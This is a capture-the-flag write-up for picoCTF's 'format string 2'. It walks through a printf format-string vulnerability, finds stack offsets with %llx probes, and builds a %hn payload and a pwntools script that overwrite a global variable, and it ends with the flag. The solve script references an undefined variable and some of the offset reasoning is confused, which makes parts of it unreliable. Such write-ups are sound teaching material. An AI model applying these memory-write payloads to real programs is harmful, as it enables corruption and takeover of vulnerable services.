# format string 2

## Solving

```
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc rhea.picoctf.net 59604
```

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

We see our vulnerability here 

```c
 scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
```
Now over here it checks if the variable ``sus`` is ``= galf`` in little endian order. This was originally Flag. If it is it returns us the flag. Else it prints out what our current sus is set to.

Now over here we ``sus`` is declared as a global variable and in this is case is set to ``int sus = 0x21737573;``

```
Non-debugging symbols:
0x000000000040038c  __abi_tag
0x0000000000402000  _IO_stdin_used
0x0000000000402104  __GNU_EH_FRAME_HDR
0x00000000004021d8  __FRAME_END__
0x0000000000403e10  __frame_dummy_init_array_entry
0x0000000000403e18  __do_global_dtors_aux_fini_array_entry
0x0000000000403e20  _DYNAMIC
0x0000000000404000  _GLOBAL_OFFSET_TABLE_
0x0000000000404050  __data_start
0x0000000000404050  data_start
0x0000000000404058  __dso_handle
0x0000000000404060  sus
```

After using gdb to investigate the stack and looking where this sus variable was located we find out that it is present at the address location ``0x0000000000404060``

Now considering they have given us an input lets see where exactly this is stored on the stack using this script

```python
print("1"*8 + ",%llx" * 50)
```

```shell
hadakoi@Laptop:~/ctfsolve$ python3 script.py | ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 11111111,7fffae4b3400,0,0,a,400,7fcb6a230860,7fcb6a268ab0,0,0,0,7fcb6a2692e0,1a0c23d,7fcb6a230d78,3131313131313131,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c  252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,786c,7c5eaa4c508a2a00,0,1,7fffae4b3750
sus = 0x21737573
You can do better!
```
Now looking at this we realise our input is stored at the 14th part of the stack.

So from here there are some things we can do specially in this case.

However say for example trying something like this ->

```shell
hadakoi@Laptop:~/ctfsolve$ (python3 -c 'print("%18$llx,%19$llx,%20$llx,%21$llx,%22$llx,11111111")') | ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 2c786c6c24323225,3131313131313131,0,7f38e1faa451,7f38e1f98140,11111111
sus = 0x21737573
You can do better!
hadakoi@Laptop:~/ctfsolve$
```
Ends up moving it to the 19th position? Now even trying to see the 14th position we see that it shows `` 2c786c6c24343125`` and the item is at the position of 20 now????

```shell
hadakoi@Laptop:~/ctfsolve$ (python3 -c 'print("%14$llx,%18$llx,%19$llx,%20$llx,%21$llx,%22$llx,11111111")') | ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 2c786c6c24343125,2c786c6c24313225,2c786c6c24323225,3131313131313131,7f2790666400,7f2790654140,11111111
sus = 0x21737573
You can do better!
hadakoi@Laptop:~/ctfsolve$
```

The reason this is is because the addresses we are trying to view prior end up buffering it from the known offset of 14 to the value of 20. as such hence overflowing it of sorts.  This because our length of payload is 48 bits or 6 bytes hence moving us 6 bytes up from 14 to 20.

As we know the base is 14 we can then start creating a payload from this.

Now essentially we want the value of `` 0x67616c66`` at ``0x404060``. Now normally when doing format string attacks instead of using 4 bytes which is the byte value of the string we are trying to change it to we split it into smaller parts which is over here hence storing them correctly.

```
0x6761 at the location (0x404062) (bytes for 6761) 26465
0x6c66 at the location (0x404060) (bytes for 6c66) 27750
```

This is keeping in mind the endiannesss

As such we can then craft our payload: 

``"'%26465x%18$hn...'" + "%1282x%19$hn...." + "\x62\x40\x40\x00\x00\x00\x00\x00" + "\x60\x40\x40\x00\x00\x00\x00\x00"``

Now over here we have the string ``%26465x%19$hn...`` the reason we use this is becuase first we want to move 26465 once that is done we have the value ``%18$hn...`` the ... here are supposed to make the length of the payload uniform as we have seen previously even the length of accessing values on the stack effects it. The 18 value comes from our known offset which is 14 however both our exploit lengths seem to be of bits 16 which comes out to 32 essentially becoming 4 bytes hence we have the value of 18


The ``1282x%19$hn....`` helps setup the next part. This because we need to get to 27750 and this used 26465 already. hence we can do 27750 - 26465 for a value of ``1285 chars``. Now as we had use padding to clear up the space and we also had to write there lets go back 3 ``...`` taking us to 1282. Now as we have written a value on the 18th value offset we now just need to write it on the 19th offset hence matching it correctly. Over here we also padd it with an extra bit ``.`` as it requires  

We also have to pass what what the targeted address is which in this case is ``0x404062`` which we pass in little endian format same for the other address.

Hence we come up with this script to automate the solve ->

So in all actuallity ->  printing all the characters of the length of the string from hex then finding the offset and putting the address at said offset.

```python
from pwn import *

p = remote('rhea.picoctf.net',59604)
s = r.recvuntil('say?')

p.sendline(b'%26465x%18$hn...' + b'%1282x%19$hn....' + b'\x62\x40\x40\x00\x00\x00\x00\x00' + b'\x60\x40\x40\x00\x00\x00\x00\x00')
p.interactive()
```

## Flag

> picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}
